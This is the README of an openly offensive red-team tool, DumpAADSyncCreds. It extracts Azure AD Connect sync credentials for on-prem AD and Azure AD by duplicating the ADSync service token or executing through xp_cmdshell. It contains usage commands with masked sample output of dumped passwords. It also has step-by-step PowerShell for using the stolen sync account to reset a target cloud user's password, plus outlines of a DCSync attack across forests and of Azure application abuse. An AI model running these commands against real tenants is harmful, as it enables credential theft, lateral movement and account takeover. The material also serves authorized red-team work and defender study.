# DumpAADSyncCreds
DumpAADSyncCreds is C# implementation of Get-AADIntSyncCredentials from [AADInternals](https://github.com/Gerenios/AADInternals), which extracts Azure AD Connect credentials to AD and Azure AD from AAD connect database.

In late 2019, a change on key storage was deployed such that only ADSync service account could access the key to decrypt configuration file from database.

DumpAADSyncCreds provides two ways to impersonate as ADSync service account:

- execute command via xp_cmdshell by [Adam Chester](https://blog.xpnsec.com/azuread-connect-for-redteam/)
- copy token from miiserver process via DuplicateToken API call by AADInternals

## Usage

```shell
cmd> set PATH=%PATH%;C:\Program Files\Microsoft Azure AD Sync\Bin;
cmd> .\DumpAADSyncCreds.exe print_help
DumpAADSyncCreds
More info: https://github.com/Hagrid29/DumpAADSyncCreds
Example:
        set PATH=%PATH%;C:\Program Files\Microsoft Azure AD Sync\Bin;
        DumpAADSyncCreds.exe get_token
Options:
Dump AAD connect account credential in current context:
        DumpAADSyncCreds.exe [raw_output]
Copy token of ADSync service account and dump AAD connect account credential:
        DumpAADSyncCreds.exe get_token [raw_output]
Execute command as ADSync service account via xp_cmdshell:
        DumpAADSyncCreds.exe xp_cmd "\"C:\Program Files\Microsoft Azure AD Sync\Bin\DumpAADSyncCreds.exe\""
Print status of ADSync service:
        DumpAADSyncCreds.exe check_service
```

Duplicate token of ADSync service account

```shell
cmd> .\DumpAADSyncCreds.exe get_token
[+] Opening database: Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync
[+] Obtained ADSync service account token from miiserver process...
==========   AD configuration   ==========
AD Domain 1: XXXXXXX
AD User 1: MSOL_XXXXXXX
AD Password 1: XXXXXXX

==========   AAD configuration   ==========
AAD User 1: Sync_XXXXXXX_XXXXXXX@XXXXXXX.onmicrosoft.com
AAD Password 1: XXXXXXX
```

Execute xp_cmdshell

```shell
cmd> DumpAADSyncCreds.exe xp_cmd "\"C:\Program Files\Microsoft Azure AD Sync\Bin\DumpAADSyncCreds.exe\""
[+] Opening database: Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync
[+] Executed command: EXEC xp_cmdshell '"C:\Program Files\Microsoft Azure AD Sync\Bin\DumpAADSyncCreds.exe"'
[+] Opening database: Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync
==========   AD configuration   ==========
AD Domain 1: XXXXXXX
AD User 1: MSOL_XXXXXXX
AD Password 1: XXXXXXX

==========   AAD configuration   ==========
AAD User 1: Sync_XXXXXXX_XXXXXXX@XXXXXXX.onmicrosoft.com
AAD Password 1: XXXXXXX
```

Print ADSync service status

```shell
cmd> .\DumpAADSyncCreds.exe check_service
Is ADSync service running:      True
ADSync bin path:                C:\Program Files\Microsoft Azure AD Sync\bin\
ADSync service account:         XXXXXXX
ADSync version:                 1.6.16.0
*** ADSync passwords can be read or modified as local administrator only for ADSync version 1.3.xx.xx
```

## Compilation
Add References > Browse > [mcrypt.dll](DumpAADSyncCreds/Lib/mcrypt.dll)

## Use Cases of AAD Connect credentials
#### Lateral move from on-perm to cloud (Reset password of cloud user)
1. Import AADInternal
2. Request an access token for AADGraph
```powershell
ps> $passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
ps> $creds = New-Object System.Management.Automation.PSCredential ("<Sync_* account>", $passwd) 
ps> Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache 
```
3. Obtain Immutable ID of target user
```powershell
ps> Get-AADIntGlobalAdmins 
ps> Get-AADIntUser -UserPrincipalName <target user> | select ImmutableId 
```
4. Reset password of target user
```powershell
ps> Set-AADIntUserPassword -SourceAnchor "<Immutable ID>" -Password "P@ss4Hagrid29" -Verbose 
```

#### Lateral move across AD Forest
During different red team engagements, I noted that it is common to have [multiple forests with single Azure AD tenant](https://docs.microsoft.com/en-us/azure/active-directory/hybrid/plan-connect-topologies#multiple-forests-single-azure-ad-tenant) topology for Azure AD Connect. WIth this setup, we could leverage AD DS connector account to compromise trusted forests from another.
1. Locate and compromise AAD connector servers and corresponding connector accounts that synchronizes users from other forests
2. Execute DCSync attack with the connector account against the target forest

#### Compromise Azure Application
If we managed to find a abusable Azure application, we could add credential to the app and potentially escalate our privilege. Refer to [AbuseAzureAPIPermissions](https://github.com/Hagrid29/AbuseAzureAPIPermissions) for more details.

## Improvement

- Dirk-jan found a way to remote dump AAD connect account credentials with RPC call. Check details in his [blog post](https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/)

## References

* https://github.com/Gerenios/AADInternals
* https://blog.xpnsec.com/azuread-connect-for-redteam/

